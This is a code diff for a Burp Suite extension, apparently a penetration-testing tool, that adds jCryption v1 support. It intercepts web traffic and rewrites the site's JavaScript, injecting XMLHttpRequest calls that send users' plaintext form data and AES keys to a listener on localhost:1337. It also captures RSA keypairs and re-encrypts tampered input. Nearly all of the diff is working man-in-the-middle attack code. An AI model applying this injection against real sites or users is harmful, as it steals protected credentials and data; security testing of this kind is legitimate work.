@@ -14,8 +14,10 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.FileReader;
+import java.io.UnsupportedEncodingException;
 import java.math.BigInteger;
 import java.net.URL;
+import java.net.URLDecoder;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.KeyFactory;
@@ -86,6 +88,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 	private IHttpRequestResponse currentlyDisplayedItem;
 	private final List<LogEntry> log = new ArrayList<LogEntry>();
 	private Map<Integer,Integer> refs = new HashMap<>();
+	private List<Integer> generateKeypairRefs = new ArrayList<Integer>();
 
 	private JTabbedPane mainTab;
 
@@ -95,12 +98,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 	private JTextField txt_passphrase_value;
 	private JComboBox<Integer> js_version_combo;
 
-	private final Integer[] js_versions = { 3, 2 };
+	private final Integer[] js_versions = { 3, 2, 1 };
 
 	private int jCryption_version = 3;
 	private byte[] mainPassphrase = "".getBytes();
 	private String mainParameter = "jCryption";
 	private List<IParameter> currentSession = null;
+	private Map<String,String> mainKeypair = new HashMap<>();
+	private Map<String,String> RSAData = new HashMap<>();
 
 	public void importCSVToLogger(String filename)
 	{
@@ -174,7 +179,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 						if (isBase64(urlDecoded))
 						{
 							Date requestDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").parse(timeStr);
-							LogEntry entry = new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), passphrase, requestDate, Integer.parseInt(version));
+							LogEntry entry = new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), null, null, passphrase, requestDate, Integer.parseInt(version));
 							entry.response = helpers.base64Decode(response);
 							entry.timeDiff = Long.parseLong(timeDiff);
 							int row = log.size();
@@ -212,13 +217,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		return p.matcher(s).matches();
 	}
 
-	public String byteArrayToHex(byte[] a)
-	{
-		StringBuilder sb = new StringBuilder(a.length * 2);
-		for(byte b: a) sb.append(String.format("%02x", b));
-		return sb.toString();
-	}
-
 	public byte[] getCurrentPassphrase(String dataHash)
 	{
 		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());
@@ -230,7 +228,21 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 	{
 		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());
 
-		return (r.size() > 0 && (r.get(0).version == 2 || r.get(0).version == 3)) ? r.get(0).version : jCryption_version;
+		return (r.size() > 0 && (r.get(0).version >= 1 && r.get(0).version <= 3)) ? r.get(0).version : jCryption_version;
+	}
+
+	public String getPlaintextFromLogger(String dataHash)
+	{
+		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());
+
+		return (r.size() > 0 && r.get(0).params.length > 0) ? helpers.bytesToString(r.get(0).params) : "";
+	}
+
+	public String getSFromLogger(String dataHash)
+	{
+		List<LogEntry> r = log.stream().filter(item -> item.dataHash.equals(dataHash)).collect(Collectors.toList());
+
+		return (r.size() > 0 && r.get(0).v1_s.length() > 0) ? r.get(0).v1_s : "";
 	}
 
 	// IBurpExtender
@@ -653,6 +665,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		private byte currentParamType;
 		private byte[] currentPassphrase;
 		private int currentJSVersion = 0;
+		private int currentS = 0;
 
 		public MessageEditorTab(IMessageEditorController controller, boolean editable)
 		{
@@ -685,24 +698,50 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 			if (content != null)
 			{
-				IParameter parameter = helpers.getRequestParameter(content, mainParameter);
-				String urlDecoded = helpers.urlDecode(parameter.getValue());
+				IParameter p = helpers.getRequestParameter(content, mainParameter);
+				String urlDecoded = helpers.urlDecode(p.getValue());
 				if (isBase64(urlDecoded))
 				{
 					byte[] ciphertext = helpers.base64Decode(urlDecoded);
 
-					String dataHash = byteArrayToHex(JCryption.getMD5(ciphertext));
+					String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
 
 					currentPassphrase = getCurrentPassphrase(dataHash);
 
 					if (currentPassphrase != null && currentPassphrase.length > 0)
 					{
 						currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
-						currentParamType = parameter.getType();
+						currentParamType = p.getType();
 						byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);
 
 						txtInput.setText(decrypted);
 						txtInput.setEditable(editable);
+					}
+				}
+				else
+				{
+					byte[] ciphertext = helpers.stringToBytes(p.getValue());
+
+					String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
+
+					currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
+
+					if (currentJSVersion == 1)
+					{
+						currentParamType = p.getType();
+						String plaintext = getPlaintextFromLogger(dataHash);
+						String tmpS = getSFromLogger(dataHash);
+
+						if (tmpS != null && tmpS.length() > 0)
+						{
+							currentS = Integer.parseInt(tmpS);
+
+							if (plaintext != null && plaintext.length() > 0)
+							{
+								txtInput.setText(helpers.stringToBytes(plaintext));
+								txtInput.setEditable(editable);
+							}
+						}
 					}
 				}
 			}
@@ -714,13 +753,18 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		public byte[] getMessage() {
 			if (txtInput.isTextModified())
 			{
-				byte[] text = txtInput.getText();
+				byte[] plaintext = txtInput.getText();
 
 				if (currentPassphrase != null && currentJSVersion != 0)
 				{
-					byte[] encrypted = JCryption.encrypt(currentPassphrase, text, currentJSVersion);
-					String input = helpers.urlEncode(helpers.base64Encode(encrypted));
+					byte[] ciphertext = JCryption.encrypt(currentPassphrase, plaintext, currentJSVersion);
+					String input = helpers.urlEncode(helpers.base64Encode(ciphertext));
 					return helpers.updateParameter(currentMessage, helpers.buildParameter(mainParameter, input, currentParamType));
+				}
+				else if (currentJSVersion == 1 && currentS != 0)
+				{
+					String ciphertext = JCryption.encrypt_v1(helpers.bytesToString(plaintext), JCryption.getRSAPubKey(mainKeypair.get("e"), mainKeypair.get("n")), currentS);
+					return helpers.updateParameter(currentMessage, helpers.buildParameter(mainParameter, ciphertext, currentParamType));
 				}
 			}
 
@@ -821,7 +865,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 					{
 						// decrypt with currentPassphrase
 						byte[] ciphertext = helpers.base64Decode(urlDecoded);
-						String dataHash = byteArrayToHex(JCryption.getMD5(ciphertext));
+						String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
 						byte[] currentPassphrase = getCurrentPassphrase(dataHash);
 						int currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
 						byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);
@@ -932,7 +976,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 					{
 						// decrypt with currentPassphrase
 						byte[] ciphertext = helpers.base64Decode(urlDecoded);
-						String dataHash = byteArrayToHex(JCryption.getMD5(ciphertext));
+						String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
 						byte[] currentPassphrase = getCurrentPassphrase(dataHash);
 						int currentJSVersion = getCurrentJCryptionJSVersion(dataHash);
 						byte[] decrypted = JCryption.decrypt(currentPassphrase, ciphertext, currentJSVersion);
@@ -994,7 +1038,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 							IRequestInfo irequestInfo = helpers.analyzeRequest(irequestResponse);
 							int ref = message.getMessageReference();
 
-							log.add(new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), helpers.bytesToString(mainPassphrase), null, jCryption_version));
+							log.add(new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(urlDecoded), null, null, helpers.bytesToString(mainPassphrase), null, jCryption_version));
 							fireTableRowsInserted(row, row);
 
 							refs.put(ref, row);
@@ -1009,6 +1053,47 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 							}
 
 							if (c.size() > 0) currentSession = c;
+						}
+					}
+					else
+					{
+						// extract encryptedValue
+						String pStr = d.getValue();
+
+						// check for encryptedValue in RSAData
+						if (RSAData.containsKey(pStr))
+						{
+							synchronized(log)
+							{
+								int row = log.size();
+								IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
+								IRequestInfo irequestInfo = helpers.analyzeRequest(irequestResponse);
+								int ref = message.getMessageReference();
+
+								// get back s+plaintext from RSAData value
+								String tmp = RSAData.get(pStr);
+								int sOff = tmp.indexOf(',');
+								String plaintext = tmp.substring(sOff+1);
+								String s = tmp.substring(0, sOff);
+
+								log.add(new LogEntry(irequestResponse, irequestInfo, helpers.stringToBytes(plaintext), pStr, s, null, null, jCryption_version));
+								fireTableRowsInserted(row, row);
+
+								refs.put(ref, row);
+
+								List<IParameter> c = new ArrayList<IParameter>();
+								List<IParameter> requestParams = irequestInfo.getParameters();
+
+								for (IParameter parameter : requestParams)
+								{
+									if (parameter.getType() != IParameter.PARAM_COOKIE) continue;
+									c.add(parameter);
+								}
+
+								if (c.size() > 0) currentSession = c;
+							}
+
+							RSAData.remove(pStr);
 						}
 					}
 				}
@@ -1030,6 +1115,40 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 								txt_passphrase_value.setText(pStr);
 								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
 							}
+							else
+							{
+								try
+								{
+									IParameter s = helpers.getRequestParameter(messageInfo.getRequest(), "s");
+									if (s != null && s.getValue().length() > 0)
+									{
+										String plaintext = URLDecoder.decode(p.getValue(), "UTF-8");
+										String ciphertext = JCryption.encrypt_v1(plaintext, JCryption.getRSAPubKey(mainKeypair.get("e"), mainKeypair.get("n")), Integer.parseInt(s.getValue()));
+
+										// add ciphertext and s+plaintext to RSAData
+										RSAData.put(ciphertext,s.getValue() + "," + plaintext);
+									}
+								}
+								catch (UnsupportedEncodingException e) {
+									e.printStackTrace();
+								}
+								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
+							}
+						}
+					}
+
+					if (jCryption_version == 1) // parse jCryption v1 "generateKeypair" request
+					{
+						IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
+
+						URL url = requestInfo.getUrl();
+						String urlStr = url.getFile();
+						if (urlStr.contains("?generateKeypair="))
+						{
+							int ref = message.getMessageReference();
+							generateKeypairRefs.add(ref);
+							//callbacks.printOutput("Found 'generateKeypair' request : " + ref);
+							message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
 						}
 					}
 				}
@@ -1060,46 +1179,88 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 				{
 					IResponseInfo x = helpers.analyzeResponse(messageInfo.getResponse());
 
-					List<String> hdr = x.getHeaders();
-					int check = 0;
-					for (String s : hdr) {
-						if (s.contains("javascript") && s.contains("Content-Type"))
-						{
-							check = 1;
-							break;
-						}
-					}
-
-					if (check == 1)
+					if (generateKeypairRefs.contains(ref))
 					{
-						boolean isHTTPS = messageInfo.getHttpService().getProtocol().equalsIgnoreCase("https");
-
-						String match_v3 = new String("success.call(this, AESEncryptionKey);");
-						String replace_v3 = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"" + (isHTTPS ? "https" : "http") + "://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
+						//callbacks.printOutput("Found 'generateKeypair' response, parsing data");
 						String response = new String(messageInfo.getResponse());
+						String match_v1 = new String("\"([^{}\":,]+)?\":\"([^{}\":,]+)?\"");
+						Pattern pattern_v1 = Pattern.compile(match_v1);
+						Matcher matcher_v1 = pattern_v1.matcher(response);
 
-						if (response.contains(match_v3) && !response.contains(replace_v3))
+						while (matcher_v1.find())
 						{
-							String r = response.replaceFirst(Pattern.quote(match_v3), replace_v3);
-							int bodyOffset = x.getBodyOffset();
-							byte[] res = r.substring(bodyOffset).getBytes();
-							message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
-							message.getMessageInfo().setComment("Hijacked by " + EXTENSION_NAME);
-
-							jCryption_version = 3;
-							js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
-
-							// jCryption v2 using AES-CTR-256 encryption algorithm, check it ;)
-							String match_v2 = new String("Aes.Ctr.encrypt(");
-							Pattern pattern_v2 = Pattern.compile(Pattern.quote(match_v2));
-							Matcher matcher_v2 = pattern_v2.matcher(response);
-							if (matcher_v2.find())
+							if (matcher_v1.groupCount() == 2)
 							{
-								jCryption_version = 2;
-								js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
+								String k = matcher_v1.group(1);
+								String v = matcher_v1.group(2);
+								//callbacks.printOutput("Match " + k + " = " + v);
+								if (mainKeypair.containsKey(k)) mainKeypair.remove(k);
+								mainKeypair.put(k, v);
 							}
+						}
+						generateKeypairRefs.remove(new Integer(ref));
+						message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
+					}
+					else
+					{
+						List<String> hdr = x.getHeaders();
+						int check = 0;
+						for (String s : hdr) {
+							if (s.contains("javascript") && s.contains("Content-Type"))
+							{
+								check = 1;
+								break;
+							}
+						}
 
-							message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
+						if (check == 1)
+						{
+							boolean isHTTPS = messageInfo.getHttpService().getProtocol().equalsIgnoreCase("https");
+
+							String match_v3 = new String("success.call(this, AESEncryptionKey);");
+							String replace_v3 = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"" + (isHTTPS ? "https" : "http") + "://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
+							String response = new String(messageInfo.getResponse());
+
+							if (response.contains(match_v3) && !response.contains(replace_v3))
+							{
+								String r = response.replaceFirst(Pattern.quote(match_v3), replace_v3);
+								int bodyOffset = x.getBodyOffset();
+								byte[] res = r.substring(bodyOffset).getBytes();
+								message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
+								message.getMessageInfo().setComment("Hijacked by " + EXTENSION_NAME);
+
+								jCryption_version = 3;
+								js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
+
+								// jCryption v2 using AES-CTR-256 encryption algorithm, check it ;)
+								String match_v2 = new String("Aes.Ctr.encrypt(");
+								Pattern pattern_v2 = Pattern.compile(Pattern.quote(match_v2));
+								Matcher matcher_v2 = pattern_v2.matcher(response);
+								if (matcher_v2.find())
+								{
+									jCryption_version = 2;
+									js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
+								}
+
+								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
+							}
+							else
+							{
+								// jCryption v1 using plain RSA encryption algorithm, check it ;)
+								String match_v1 = new String("$.jCryption.encrypt = function(string,keyPair,callback) {");
+								String replace_v1 = new String("\\$.jCryption.encrypt = function(string,keyPair,callback) { var x = new XMLHttpRequest(); x.open(\"GET\", \"" + (isHTTPS ? "https" : "http") + "://localhost:1337/?p=\"+encodeURIComponent(string)+\"&s=\"+keyPair.chunkSize, true); x.send();");
+								if (response.contains(match_v1) && !response.contains(replace_v1))
+								{
+									String r = response.replaceFirst(Pattern.quote(match_v1), replace_v1);
+									int bodyOffset = x.getBodyOffset();
+									byte[] res = r.substring(bodyOffset).getBytes();
+									message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
+									message.getMessageInfo().setComment("Hijacked by " + EXTENSION_NAME);
+									jCryption_version = 1;
+									js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
+									message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
+								}
+							}
 						}
 					}
 				}
@@ -1128,7 +1289,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		}
 
 		// search keypair
-		if (check == 0)
+		if (check == 0 && jCryption_version == 1)
 		{
 			String r = new String(response);
 			String match_v1 = new String("\"([^{}\":,]+)?\":\"([^{}\":,]+)?\"");
@@ -1170,7 +1331,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 			final String jCryptionv10Digest = "9eaabd71bfeda2707488e6937377b8c2";
 
 			byte[] jsDigest = JCryption.getMD5(res);
-			String strDigest = byteArrayToHex(jsDigest);
+			String strDigest = JCryption.byteArrayToHex(jsDigest);
 
 			if (strDigest.equals(jCryptionv10Digest) ||
 				strDigest.equals(jCryptionv11Digest) ||
@@ -1381,13 +1542,15 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		final String method;
 		final URL url;
 		final byte[] params;
+		final String v1_params;
+		final String v1_s;
 		final String cookie;
 		final String timeStr;
 		final String comment;
 		final String passphrase;
 		String dataHash;
 
-		public LogEntry(IHttpRequestResponsePersisted irequestResponse, IRequestInfo irequestInfo, byte[] ciphertext, String passphrase, Date irequestDate, int version)
+		public LogEntry(IHttpRequestResponsePersisted irequestResponse, IRequestInfo irequestInfo, byte[] ciphertext, String v1_params, String v1_s, String passphrase, Date irequestDate, int version)
 		{
 			this.version = version;
 			this.requestResponse = irequestResponse;
@@ -1396,7 +1559,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 			this.host = requestResponse.getHttpService().getHost();
 			this.method = requestInfo.getMethod();
 			this.url = requestInfo.getUrl();
-			this.params = (passphrase.getBytes().length > 0) ? JCryption.decrypt(passphrase.getBytes(), ciphertext, jCryption_version) : "".getBytes();
+
+			if (version == 1) this.params = ciphertext;
+			else              this.params = (passphrase.getBytes().length > 0) ? JCryption.decrypt(passphrase.getBytes(), ciphertext, jCryption_version) : "".getBytes();
+
+			this.v1_params = v1_params;
+			this.v1_s = v1_s;
 
 			List<IParameter> requestParams = requestInfo.getParameters();
 
@@ -1412,7 +1580,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 			this.timeStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(this.requestDate);
 			this.comment = (requestResponse.getComment() != null) ? requestResponse.getComment() : "";
 			this.passphrase = passphrase;
-			this.dataHash = byteArrayToHex(JCryption.getMD5(ciphertext));
+
+			if (version == 1) this.dataHash = JCryption.byteArrayToHex(JCryption.getMD5(helpers.stringToBytes(v1_params)));
+			else              this.dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
 		}
 
 		// convert entry to CSV
@@ -1443,6 +1613,13 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 	private static class JCryption
 	{
+		public static String byteArrayToHex(byte[] a)
+		{
+			StringBuilder sb = new StringBuilder(a.length * 2);
+			for(byte b: a) sb.append(String.format("%02x", b));
+			return sb.toString();
+		}
+
 		public static byte[] getMD5(byte[] input)
 		{
 			try
@@ -1511,6 +1688,76 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 				PublicKey pk = kf.generatePublic(new X509EncodedKeySpec(k.getEncoded()));
 				return pk;
 			} catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
+				throw new RuntimeException(e);
+			}
+		}
+
+		public static String encrypt_v1(String plaintext, PublicKey publicKey, int chunkSize)
+		{
+			try
+			{
+				// computing plaintext checksum
+				int charSum = 0;
+				for (int i = 0; i < plaintext.length(); i++)
+					charSum += Character.codePointAt(plaintext, i);
+
+				// plaintext = (checksum || plaintext)
+				String tag = "0123456789abcdef";
+				char hex1 = tag.charAt((charSum & 0xF0) >> 4);
+				char hex2 = tag.charAt(charSum & 0x0F);
+				String hex = "" + hex1 + hex2;
+				String taggedString = hex + plaintext;
+
+				// padding with zeros to fill chunkSize
+				byte[] tmp = taggedString.getBytes();
+
+				int len = tmp.length;
+				while ((len % chunkSize) != 0) len++;
+
+				byte[] encrypt = new byte[len];
+				System.arraycopy(tmp, 0, encrypt, 0, tmp.length);
+
+				// initializing RSA/ECB/NoPadding cipher with Public Key
+				Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
+				cipher.init(Cipher.ENCRYPT_MODE, publicKey);
+
+				// splitting the plaintext due to RSA/ECB restriction on plaintext maxlength
+				int rounds = len / chunkSize;
+				int bs = cipher.getOutputSize(chunkSize);
+				byte[] ciphertext = new byte[(bs * rounds) + (rounds-1)];
+				byte[] message = new byte[chunkSize];
+				String cipherString = "";
+
+				for (int x = 0; x < rounds; x++)
+				{
+					if (x > 0)
+					{
+						ciphertext[(x * bs) + (x-1)] = 0x2b; // add '+'
+						cipherString += '+';
+					}
+
+					// get chunk and reverse it
+					System.arraycopy(encrypt, (x * chunkSize), message, 0, chunkSize);
+					for (int y = 0; y < message.length / 2; y++)
+					{
+						byte t = message[y];
+						message[y] = message[message.length - y - 1];
+						message[message.length - y - 1] = t;
+					}
+
+					// encrypt plaintext
+					byte[] cipherBlock = cipher.doFinal(message, 0, message.length);
+
+					// update ciphertext
+					System.arraycopy(cipherBlock, 0, ciphertext, (x * bs) + x, bs);
+					cipherString += byteArrayToHex(cipherBlock);
+				}
+
+				// ciphertext = block(01) || '+' || block(02) || '+' || ... || block(N-1) || '+' || block(N)
+				// return Base64.getEncoder().encodeToString(cipherText);
+				// return ciphertext;
+				return cipherString;
+			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e) {
 				throw new RuntimeException(e);
 			}
 		}
